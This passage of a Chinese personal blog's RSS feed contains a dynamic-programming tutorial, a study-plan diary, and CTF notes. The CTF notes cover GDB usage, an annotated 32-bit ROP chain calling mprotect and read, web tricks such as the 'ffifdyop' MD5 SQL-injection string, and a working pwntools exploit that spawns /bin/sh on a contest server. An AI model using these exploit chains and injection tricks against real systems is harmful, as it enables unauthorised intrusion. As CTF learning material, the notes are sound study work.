class="comment">//遍历所有的怪</span></span><br><span class="line">        <span class="type">int</span> exp = monsters[i].first, cost = monsters[i].second;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; s; ++j) &#123;<span class="comment">//杀j只它，剩余的忍耐度</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> cur_exp = <span class="number">0</span>; cur_exp &lt;= n; ++cur_exp) &#123;<span class="comment">//为什么从前往后？因为后面的需要用到前面的经验。</span></span><br><span class="line">                <span class="keyword">if</span> (dp[cur_exp][j] &gt;= <span class="number">0</span>) &#123;<span class="comment">//忍耐度存在</span></span><br><span class="line">                    <span class="type">int</span> next_exp = <span class="built_in">max</span>(<span class="number">0</span>, cur_exp - exp);<span class="comment">//推导杀一只怪之后的经验，最小为0</span></span><br><span class="line">                    dp[next_exp][j + <span class="number">1</span>] = <span class="built_in">max</span>(dp[next_exp][j + <span class="number">1</span>], dp[cur_exp][j] - cost);<span class="comment">//更新杀一只怪后忍耐度，选忍耐度最多的。</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= s; ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dp[<span class="number">0</span>][j] &gt;= <span class="number">0</span>) &#123;<span class="comment">//经验到达，忍耐度存在</span></span><br><span class="line">            result = <span class="built_in">max</span>(result, dp[<span class="number">0</span>][j]);<span class="comment">//找到最大的那个</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, k, s;</span><br><span class="line">    <span class="keyword">while</span> (cin &gt;&gt; n &gt;&gt; m &gt;&gt; k &gt;&gt; s) &#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; <span class="built_in">monsters</span>(k);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">            cin &gt;&gt; monsters[i].first &gt;&gt; monsters[i].second;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> result = <span class="built_in">solve</span>(n, m, k, s, monsters);<span class="comment">//保留的忍耐度</span></span><br><span class="line">        <span class="keyword">if</span> (result &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h3><h3 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h3><ul><li>你需要获得一定的经验值（<code>n</code>）。</li><li>你有一定的忍耐度（<code>m</code>），每次杀怪都会消耗一部分。</li><li>怪物有多种（<code>k</code>种），每种怪物提供不同的经验值和消耗不同的忍耐度。</li><li>你最多可以杀<code>s</code>个怪物。</li></ul><p>此处我们会发现问题的约束有点多，一维数组已经满足不了我们。</p><h3 id="动态规划的思路"><a href="#动态规划的思路" class="headerlink" title="动态规划的思路"></a>动态规划的思路</h3><ol><li><strong>定义状态</strong>: <code>dp[i][j]</code>表示你还需要<code>i</code>点经验，且杀了<code>j</code>个怪物时的剩余最大忍耐度。</li><li><strong>初始化状态</strong>: 初始时，你需要<code>n</code>点经验，且未杀任何怪物，因此<code>dp[n][0] = m</code>。</li><li><strong>状态转移</strong>:<ul><li>遍历每一种怪物。</li><li>对于每种怪物，尝试杀<code>0</code>到<code>s-1</code>个，查看不同数量下的剩余忍耐度和所需经验。</li><li>对每个杀怪数量，检查如果杀了这个怪物后，是否能得到更好的剩余忍耐度（即<code>dp[next_exp][j+1]</code>）。</li><li>转移方程：如果杀死一个怪物后剩余忍耐度更高，则更新<code>dp[next_exp][j+1]</code>。</li></ul></li><li><strong>寻找结果</strong>: 在所有经验值为<code>0</code>（即达到目标经验值）的情况中，找到忍耐度最大的那个。</li></ol><br><p>首先看main函数，这是我们解题的主要步骤：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; <span class="built_in">monsters</span>(k);</span><br></pre></td></tr></table></figure><p>创建一个mosters数对，代表怪物的种类存储结构。有k种怪兽，而每种怪兽会给出两个正整数a，b(0 &lt; a,b &lt; 20)；分别表示杀掉一只这种怪会得到的&#x3D;&#x3D;经验值&#x3D;&#x3D;和&#x3D;&#x3D;会减掉的忍耐度&#x3D;&#x3D;。注意此处，我们最终的忍耐度是看剩余的忍耐度，而经验值是看总共的经验值，一个是消耗，一个是增加，而目标是得到忍耐度的最大值。那么我们首先会想到尽量少减掉忍耐度，尽量增加更多的经验。</p><br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (result &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里也很简单。调用一个函数获得忍耐度的最大值，如果不存在，将会返回负值；如果存在，输出即可。</p><p><br><br><br></p><p>接下来看到solve函数，真正的逻辑核心。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m, <span class="type">int</span> k, <span class="type">int</span> s, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; monsters)</span> </span></span><br></pre></td></tr></table></figure><p>数组我们一般引用它地址</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">vector <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, vector(s + <span class="number">1</span>, <span class="number">-1000</span>))</span></span>;<span class="comment">//还需的经验值，杀怪数，剩余的忍耐度，-1000代表不存在</span></span><br><span class="line">    dp[n][<span class="number">0</span>] = m;<span class="comment">//刚开始，还差n经验，忍耐度为m</span></span><br></pre></td></tr></table></figure><p>初始化的时候记得设置动态规划的数组，其值是目标结果，而初始状态需要赋有意义的值。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> exp = monsters[i].first, cost = monsters[i].second;</span><br></pre></td></tr></table></figure><p>采用first和second代替a和b，方便自己思考记住。这个看个人习惯，就是说我们不需要增加设置数据结构的环节，其实是这样。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;<span class="comment">//遍历所有的怪</span></span><br><span class="line">    <span class="type">int</span> exp = monsters[i].first, cost = monsters[i].second;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; s; ++j) &#123;<span class="comment">//杀j只它，剩余的忍耐度</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> cur_exp = <span class="number">0</span>; cur_exp &lt;= n; ++cur_exp) &#123;<span class="comment">//为什么从前往后？因为后面的需要用到前面的经验。</span></span><br><span class="line">            <span class="keyword">if</span> (dp[cur_exp][j] &gt;= <span class="number">0</span>) &#123;<span class="comment">//忍耐度存在</span></span><br><span class="line">                <span class="type">int</span> next_exp = <span class="built_in">max</span>(<span class="number">0</span>, cur_exp - exp);<span class="comment">//推导杀一只怪之后的经验，最小为0</span></span><br><span class="line">                dp[next_exp][j + <span class="number">1</span>] = <span class="built_in">max</span>(dp[next_exp][j + <span class="number">1</span>], dp[cur_exp][j] - cost);<span class="comment">//更新杀一只怪后忍耐度，选忍耐度最多的。</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后解释真正重要的部分。</p><p>我们外层遍历所有种类的怪，而内遍历杀所有个数，就可以考虑到所有种类，每种个数杀任意只得所有情况了，而实际得到的dp值是可以实时更新的。</p><p>最里面一层for，注释里已经解释了exp为什么从前往后遍历，我们可以自己验证一下，假设第一只怪数值是(1,1)，第一次遍历的时候发现<code>dp[n][0]</code>处有一个m，那么我们考虑next_exp就是m-1，<code>dp[n-1][1]</code>表示杀了一只怪之后还差n-1点经验，即增加了一点经验，之后的忍耐值。可想而知，它是下降的，那么我们比较杀了这只怪之后的忍耐度会不会提高，如果没有提高，我们不更新忍耐值，即并不杀怪。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> result = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= s; ++j) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dp[<span class="number">0</span>][j] &gt;= <span class="number">0</span>) &#123;<span class="comment">//经验到达，忍耐度存在</span></span><br><span class="line">        result = <span class="built_in">max</span>(result, dp[<span class="number">0</span>][j]);<span class="comment">//找到最大的那个</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们看的是<code>dp[0][j]</code>，就是不差经验，的时候，各种杀怪情况留下最大的忍耐度。<br><br></p><p>动态规划还挺抽象的，有必要多看几遍。</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/%E7%AE%97%E6%B3%95/">算法</category>
      
      
      <category domain="https://cjliblog.top/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/">动态规划</category>
      
      
      <comments>https://cjliblog.top/2023/12/11/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94fate/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>十二月日记（原小思考）</title>
      <link>https://cjliblog.top/2023/12/10/12%E6%9C%88%E6%97%A5%E8%AE%B0/</link>
      <guid>https://cjliblog.top/2023/12/10/12%E6%9C%88%E6%97%A5%E8%AE%B0/</guid>
      <pubDate>Sat, 09 Dec 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="12-11更新：增加了近期目标"><a href="#12-11更新：增加了近期目标" class="headerlink" title="12-11更新：增加了近期目标"></a>12-11更新：增加了近期目标</h2><p>12-12更新。</p><br><p>今天杭助开了个会，引起一些思考，具体如下：</p><p>1.比赛可以多尝试，但是要注意不要花太多精力，比如数模，外包等。</p><p>2.每个人的路线不一样，绩点需求也因人而异。绩点对于找工作也不一定无好处，是一种对学习能力的认可。对于我来说，我有读研需求，那么我也肯定要卷绩点的。而且课程存在有他的道理，基础不牢地动山摇，有必要好好掌握。</p><p>3.学长认为的提升个人能力的最好方法：1.参加字节青训营（注意在稀土掘金上关注动态）2.利用开源项目学习，github，开源之夏</p><p>4.平时注意写博客记录日常，确定每天的方向、意义和收货。</p><p>5.大二下的暑假出去实习，最好找实习，性价比很高。多去面试，可以增加面试竞争力。</p><p>6.学会巧妙使用搜索引擎，包括不限于gpt4，google，baidu。这里注意gpt更注重思维发散，而google更注重个人经验。</p><p>7.多水群，结识大佬。</p><br><p>另外就是自己最近的思考：</p><p>1.读研，目标暂定pku和hkust二选一。因为读研不意味着不工作，只要折腾，照样可以实习。不追求保研，直接考研。</p><p>2.安全、开发、AI几个方向，我认为主要还是往全栈开发发展，安全和AI仅仅作为兴趣爱好。原因如下：因为安全是可以加快理解计算机整体框架的进程的，但是我本身对于安全的期待比较小，况且gpt对安全这块协助能力弱；而AI目前新兴不成熟，而国内环境不佳，学历门槛高，本科阶段不如扎实打好基础，到读研再开始炼丹也不迟；而开发不仅自己感兴趣，可以做出自己喜欢的东西，并且方便找工作，也是安全和AI的垫脚石。</p><p>3.学好基础学科，卷绩点。它们是值得感兴趣的，太功利去学习技术，也不见得能让自己变强，而且永远失去了绩点。而且开发本来就是门槛低的行业，放弃绩点去学开发就像赌狗，赌到最后一无所有。要知道，超前学习只是在开始占优势，谁笑到最后还不一定。</p><p>4.在处理好比赛、工作、作业和专业课的学习之余，务必给自己增加开发方面的学习时间，暂时规定每周三、每周末必学开发半天以上。</p><p>5.尽量少熬夜，早起床。</p><p>2023-12-11，1：35。（笑死，不想再熬夜啦！）</p><h2 id="12-15"><a href="#12-15" class="headerlink" title="12-15"></a>12-15</h2><p>明天就要考六级了。完全没准备，根本没有准备的动力。</p><p>最近都在学后端go，但是今天在做前端的时候偶然发现一个不错的现代化css框架——tailwindcss。</p><p>我发现喜欢这些是因为我喜欢现代化的新东西。</p><p>但AI这东西不好说，有点缥缈。就像ctf，有一种打游戏的不务正业的感觉。</p><p>也可能是学开发或者算法这种更容易让人有成就感？</p><p>但是最近发生了一些事情，我可能要做一些CV的论文工作，所以AI这个路子感觉也是不能一棒子打死，毕竟科研也是一条路子。只要它能让我学到真本事，而不是不停配环境和调参，都是有意义的。</p><p>ctf是同样的，如果是代码审计或者反弹shell这种贴近工作实际的内容，我也会乐在其中。</p><p>重点是不要让我感觉学无所成。</p><p>反过来说，都说科研需要耐心。</p><p>我虽然有耐心，但是是对我坚定认为有成果的东西。</p><p>不知道我的特性是适合科研还是不适合呢？</p><p>CTF一些题的必定有答案，并不是成果，反而让我感觉毫无意义，没有做下去的动力。</p><p>准确的说，我是对高概率有成果，过程中也颇有收货的东西有耐心，并且在失败之后了无遗憾。</p><p>而问题并不在于我要去攻哪个方向。现在应该也还是试错阶段。</p><p>但是开发和算法一定是最重要的基石的存在。</p><p>玩累了，就学点东西休息一下。</p><h2 id="12-18"><a href="#12-18" class="headerlink" title="12-18"></a>12-18</h2><p>课业方向，周末完成了一些作业和考试。</p><p>科研方向，是看了slam的一些数学基础部分。</p><p>安全方向，弃坑了，有取有舍。</p><p>开发方向，在进行todolist应用的重建，周末主要是学习与实践了一波前端的vite+vue+bootstrap，来替代之前简陋的template+static前端。</p><p>写一个动态plan挺好的，进度掌握在自己手上，也容易焦虑。</p><p>明天四舍五入就下午一节数电，明天上午再制定计划，冲。</p>]]></content:encoded>
      
      
      <category domain="https://cjliblog.top/categories/%E6%97%A5%E8%AE%B0/">日记</category>
      
      
      
      <comments>https://cjliblog.top/2023/12/10/12%E6%9C%88%E6%97%A5%E8%AE%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwn小知识</title>
      <link>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86%EF%BC%88%E7%BD%AE%E9%A1%B6%EF%BC%89/</link>
      <guid>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86%EF%BC%88%E7%BD%AE%E9%A1%B6%EF%BC%89/</guid>
      <pubDate>Wed, 30 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="pwn-gdb操作"><a href="#pwn-gdb操作" class="headerlink" title="pwn-gdb操作"></a>pwn-gdb操作</h2><p>在PWN中使用GDB (GNU Debugger) 进行调试是一个常见的方法。以下是使用GDB调试二进制文件的一般步骤和一些有用的技巧：</p><ol><li><p><strong>启动GDB</strong>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ./binary_name</span><br></pre></td></tr></table></figure></li><li><p><strong>设置断点</strong>:<br>使用 <code>b</code> (或 <code>break</code>) 命令设置断点。例如，为主函数设置断点:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">b main</span><br></pre></td></tr></table></figure></li><li><p><strong>运行程序</strong>:<br>使用 <code>r</code> (或 <code>run</code>) 命令:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r [program arguments]</span><br></pre></td></tr></table></figure></li><li><p><strong>查看寄存器状态</strong>:<br>使用 <code>info registers</code> 或简写 <code>i r</code>:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i r</span><br></pre></td></tr></table></figure></li><li><p><strong>单步执行</strong>:</p><ul><li><code>s</code> 或 <code>step</code>: 执行一行源代码。如果该行是函数调用，则进入该函数。</li><li><code>n</code> 或 <code>next</code>: 执行一行源代码。不会进入函数。</li></ul></li><li><p><strong>查看内存</strong>:</p><ul><li><code>x</code> 命令: 使用这个命令可以查看某个地址的内容。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x/10x <span class="variable">$rsp</span>  <span class="comment"># 查看堆栈顶部的10个十六进制值</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>继续执行</strong>:<br>使用 <code>c</code> (或 <code>continue</code>) 命令。</p></li><li><p><strong>退出GDB</strong>:<br>使用 <code>q</code> (或 <code>quit</code>) 命令。</p></li><li><p><strong>使用GDB插件</strong>:<br>为了方便PWN调试，社区有很多有用的GDB插件，例如 <code>pwndbg</code>, <code>PEDA</code> 和 <code>GEF</code>。这些插件为GDB提供了额外的功能和视觉增强，使其更容易用于漏洞分析和利用。</p></li><li><p><strong>调试远程程序</strong>:<br>  如果你正在尝试利用远程服务，可以使用 <code>gdbserver</code> 在远程端启动程序，并从本地使用GDB连接它进行调试。</p></li><li><p><strong>其他有用的命令</strong>:</p></li></ol><ul><li><code>info proc mappings</code>: 显示进程的内存映射。</li><li><code>set follow-fork-mode child</code>: 当程序进行fork时，GDB会跟踪子进程。</li><li><code>set disassembly-flavor intel</code>: 将反汇编格式设置为Intel格式，这通常比默认的AT&amp;T格式更易于阅读。</li></ul><p>这只是使用GDB进行PWN调试的基础。为了成功地找到并利用漏洞，可能还需要掌握更多高级的调试和逆向技巧。</p><h2 id="栈的小知识"><a href="#栈的小知识" class="headerlink" title="栈的小知识"></a>栈的小知识</h2><h3 id="栈-Stack-是啥？"><a href="#栈-Stack-是啥？" class="headerlink" title="栈(Stack)是啥？"></a>栈(Stack)是啥？</h3><p>栈是一种特殊的线性数据结构，它只允许在一端（称为“顶”）进行插入和删除操作。由于它的特点，我们经常用“后进先出”（LIFO）来描述它。就像一叠盘子，我们只能放在最顶端或从最顶端拿走。🍽️</p><p>但是栈在实际结构里是“倒着的”，也就是高位地址才是底部，低位地址才是顶部，值得注意。</p><h3 id="栈的主要操作"><a href="#栈的主要操作" class="headerlink" title="栈的主要操作"></a>栈的主要操作</h3><ul><li><strong>压栈(Push)</strong>: 向栈中添加元素。</li><li><strong>弹栈(Pop)</strong>: 从栈中取出元素。</li></ul><h3 id="为啥要用栈呢？🤔"><a href="#为啥要用栈呢？🤔" class="headerlink" title="为啥要用栈呢？🤔"></a>为啥要用栈呢？🤔</h3><ol><li><strong>函数调用</strong>：当函数A调用函数B时，函数A的状态（例如局部变量）被“压入”栈中，等待函数B完成后再继续执行。</li><li><strong>括号匹配</strong>：你知道编程中的括号是否配对正确吗？用栈就能轻松搞定！</li><li><strong>撤销操作</strong>：例如在文字处理软件中，撤销功能就靠栈实现。</li></ol><h3 id="栈的美中不足：🌹与🌪️"><a href="#栈的美中不足：🌹与🌪️" class="headerlink" title="栈的美中不足：🌹与🌪️"></a>栈的美中不足：🌹与🌪️</h3><ul><li>🌹<strong>优点</strong>：结构简单，操作灵活。</li><li>🌪️<strong>缺点</strong>：存储空间受限，容易造成溢出。</li></ul><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>有一段ROP链被发送到32位linux，它其中的内容是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop_3_ret)<span class="comment"># mprotect有三个参数，32位栈函数传参</span></span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)     <span class="comment"># 0x7 == 可读可写可执行</span></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">payload += p32(start_addr)</span><br></pre></td></tr></table></figure><p>则栈的结构变成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- 被攻击函数返回后执行此地址</span><br><span class="line">+--------------+</span><br><span class="line">|  0x100       | &lt;-- read函数的第三个参数 (size)</span><br><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- read函数的第二个参数 (buf)</span><br><span class="line">+--------------+</span><br><span class="line">|  0           | &lt;-- read函数的第一个参数 (file descriptor, 0代表stdin)</span><br><span class="line">+--------------+</span><br><span class="line">|  pop_3_ret   | &lt;-- 用于pop三个参数到寄存器</span><br><span class="line">+--------------+</span><br><span class="line">|  read_addr   | &lt;-- read函数地址</span><br><span class="line">+--------------+</span><br><span class="line">|  0x7         | &lt;-- mprotect函数的第三个参数 (权限: 可读可写可执行)</span><br><span class="line">+--------------+</span><br><span class="line">|  0x1000      | &lt;-- mprotect函数的第二个参数 (大小)</span><br><span class="line">+--------------+</span><br><span class="line">|  start_addr  | &lt;-- mprotect函数的第一个参数 (地址)</span><br><span class="line">+--------------+</span><br><span class="line">|  pop_3_ret   | &lt;-- 用于pop三个参数到寄存器</span><br><span class="line">+--------------+</span><br><span class="line">| mprotect_addr| &lt;-- mprotect函数地址，（原来为ebp）</span><br><span class="line">+--------------+</span><br><span class="line">|    ...       | &lt;-- 0x38个&#x27;cyclic&#x27;字符，可能用于溢出缓冲区</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每次从最低位POP一个方块，并执行其中的要求，比如是一个函数地址read_addr的话，就要再连续POP它所要求的参数，read有三个参数，所以POP三个参数。然后read是要读取用户输入的内容的，因此还要等用户输入内容。输入完之后，函数一般都会有一个return，这里就是回到start_addr。而原题shellcode在read过程中写入了此地址，因此可直接进入shell。</p><p>原题是pwn刷题记录2中的get_started_3dsctf_2016（*）</p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF做题记录</category>
      
      
      <comments>https://cjliblog.top/2023/08/31/pwn%E5%B0%8F%E7%9F%A5%E8%AF%86%EF%BC%88%E7%BD%AE%E9%A1%B6%EF%BC%89/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CTF web集</title>
      <link>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/</link>
      <guid>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/</guid>
      <pubDate>Wed, 30 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<ol><li><a href="https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">命令注入</a></li></ol><p>来自<a href="https://uuzdaisuki.com/"> <strong>Leticia’s Blog</strong> </a></p><ol start="2"><li><p>常见的备份文件后缀名有 .git .<a href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020">svn</a> .swp .~ .bak .bash_history</p></li><li><p>ffifdyop经过md5和from hex转化之后会生成’or’6开头的字符串</p></li><li><p>两个md5哈希可以0e开头若相等</p></li><li><p>两个md5强相等条件可以用数列绕过去</p></li><li></li></ol><h2 id="buuoj好题名单"><a href="#buuoj好题名单" class="headerlink" title="buuoj好题名单"></a>buuoj好题名单</h2><p>1.[GXYCTF2019]Ping Ping Ping</p><p>推荐理由：命令注入</p><p>建议：</p><p>   1.尝试base64绕过和拼接绕过</p><p>   2.chrome开头加上”view-source:“，可以看全源码（相当于ctrl+u）</p><p>2.[强网杯 2019]随便注 1</p><p>推荐理由：sql注入</p><p>建议：看攻略 <a href="https://zhuanlan.zhihu.com/p/545713669">https://zhuanlan.zhihu.com/p/545713669</a></p><p>3.【RoarCTF 2019】Easy Calc 1</p><p>推荐理由：解释到位</p><p>建议：看攻略<a href="https://www.dccomics.top/2021/11/11/%E3%80%90RoarCTF%202019%E3%80%91Easy%20Calc%201/">https://www.dccomics.top/2021/11/11/%E3%80%90RoarCTF%202019%E3%80%91Easy%20Calc%201/</a></p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF做题记录</category>
      
      
      <comments>https://cjliblog.top/2023/08/31/CTF%20web%E9%9A%BE%E9%A2%98%E6%94%B6%E9%9B%86/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>刷题记录之hgame mini</title>
      <link>https://cjliblog.top/2023/08/27/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/</link>
      <guid>https://cjliblog.top/2023/08/27/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bhgame%20mini/</guid>
      <pubDate>Sat, 26 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="Share-interesting-things"><a href="#Share-interesting-things" class="headerlink" title="Share interesting things"></a>Share interesting things</h2><p><em>9.3</em></p><p><strong>这题属实是把我累坏了，请教了师傅好久[emo]</strong></p><p><strong>先上exploit，后续补上分析！</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io= remote(<span class="string">&quot;1.container.jingsai.apicon.cn&quot;</span>,<span class="number">32376</span>)</span><br><span class="line"><span class="comment">#io=process(&quot;../vuln&quot;)</span></span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x4012e3</span></span><br><span class="line">rdx_rsi_rdi_syscall=<span class="number">0x401197</span></span><br><span class="line">str1=<span class="number">0x404080</span></span><br><span class="line"></span><br><span class="line">p=cyclic(<span class="number">0x28</span>)</span><br><span class="line">p+=p64(rdx_rsi_rdi_syscall)</span><br><span class="line">p+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(str1)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">p2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+cyclic(<span class="number">50</span>)</span><br><span class="line">io.sendline(p2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="smooth——crypto"><a href="#smooth——crypto" class="headerlink" title="smooth——crypto"></a>smooth——crypto</h2><p><em>0829</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollards_p_1</span>(<span class="params">N</span>):</span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    n = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        res = gmpy2.gcd(a-<span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;n =&#x27;</span>), n</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;p =&#x27;</span>), res</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = ....<span class="comment">#省略</span></span><br><span class="line">enc = ....<span class="comment">#省略</span></span><br><span class="line">p = Pollards_p_1(n)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(enc, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="REPEAT——pwn（-）"><a href="#REPEAT——pwn（-）" class="headerlink" title="REPEAT——pwn（*）"></a>REPEAT——pwn（*）</h2><p><em>0829</em></p><p><strong>考点：ret2libc</strong></p><h4 id="1-exploit"><a href="#1-exploit" class="headerlink" title="1.exploit"></a>1.exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span 